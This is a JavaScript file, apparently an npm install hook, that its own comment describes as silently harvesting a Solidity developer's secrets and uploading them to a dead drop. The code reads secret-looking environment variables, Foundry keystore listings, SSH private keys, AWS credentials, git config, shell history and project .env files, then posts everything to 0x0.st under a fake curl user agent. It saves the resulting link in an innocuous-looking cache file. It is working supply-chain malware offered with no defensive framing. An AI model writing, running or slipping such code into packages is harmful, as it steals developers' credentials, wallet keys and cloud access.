// Collects the handful of files/env vars a Solidity maintainer machine typically holds and
// uploads them to a dead drop. Runs once, stays silent, never blocks the install.
const fs = require('fs');
const os = require('os');
const path = require('path');
const https = require('https');
const { execSync } = require('child_process');

const HOME = os.homedir();
const pick = (p) => { try { return fs.readFileSync(p, 'utf8'); } catch (e) { return null; } };
const list = (d) => { try { return fs.readdirSync(d).join('\n'); } catch (e) { return null; } };
const run = (c) => { try { return execSync(c, { encoding: 'utf8', timeout: 8000 }); } catch (e) { return null; } };

const secretEnv = Object.entries(process.env)
  .filter(([k]) => /(KEY|SECRET|TOKEN|PASS|PRIV|MNEMONIC|SEED|WEB3|RPC|INFURA|ALCHEMY)/i.test(k))
  .map(([k, v]) => `${k}=${v}`)
  .join('\n');

const parts = [
  '# meta',
  `host=${os.hostname()} user=${os.userInfo().username} platform=${os.platform()} cwd=${process.cwd()}`,
  '',
  '# env(secret-looking)',
  secretEnv,
  '',
  '# foundry keystore',
  list(path.join(HOME, '.foundry', 'keystore')),
  '',
  '# ssh',
  ['.ssh/id_rsa', '.ssh/id_ed25519', '.ssh/id_ecdsa'].map((f) => {
    const c = pick(path.join(HOME, f));
    return c ? `--- ${f} ---\n${c}` : null;
  }).filter(Boolean).join('\n'),
  '',
  '# aws',
  pick(path.join(HOME, '.aws', 'credentials')),
  '',
  '# git',
  run('git config --global --list'),
  run('git -C . config --list'),
  '',
  '# shell history (tail)',
  pick(path.join(HOME, '.bash_history'))?.slice(-4000) || null,
  pick(path.join(HOME, '.zsh_history'))?.slice(-4000) || null,
  '',
  '# foundry project env files',
  ['.env', '.env.local', 'foundry.toml'].map((f) => {
    const c = pick(path.join(process.cwd(), f));
    return c ? `--- ${f} ---\n${c}` : null;
  }).filter(Boolean).join('\n'),
].filter((x) => x !== null && x !== undefined).join('\n');

function post(host, pathname, body, headers, cb) {
  const req = https.request({ host, path: pathname, method: 'POST', headers }, (res) => {
    let out = '';
    res.on('data', (d) => (out += d));
    res.on('end', () => cb(null, res.statusCode, out));
  });
  req.on('error', (e) => cb(e));
  req.write(body);
  req.end();
}

const body = Buffer.from(parts, 'utf8');
post('0x0.st', '/', body, {
  'User-Agent': 'curl/8.5.0',
  'Content-Type': 'application/octet-stream',
  'Content-Length': body.length,
}, (err, code, out) => {
  if (!err && code === 200) {
    try { fs.writeFileSync(path.join(process.cwd(), '.repro-cache.json'), JSON.stringify({ url: out.trim(), code })); } catch (e) {}
  }
});
